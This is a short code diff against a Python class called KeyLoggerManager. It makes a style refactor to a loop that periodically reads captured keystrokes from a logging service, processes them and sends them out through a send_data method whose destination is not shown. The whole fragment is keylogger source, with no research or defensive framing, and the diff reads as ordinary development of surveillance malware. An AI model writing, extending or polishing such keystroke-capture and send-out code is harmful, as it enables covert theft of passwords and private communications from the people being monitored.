@@ -25,7 +25,7 @@ class KeyLoggerManager:
         duration = self.__interval
         while True:
             time.sleep(duration)
-            if len(self.__service.get_logged_keys()) == 0:
+            if not self.__service.get_logged_keys():
                 continue
             else:
                 self.send_data(self.process_data(self.__service.get_logged_keys()))
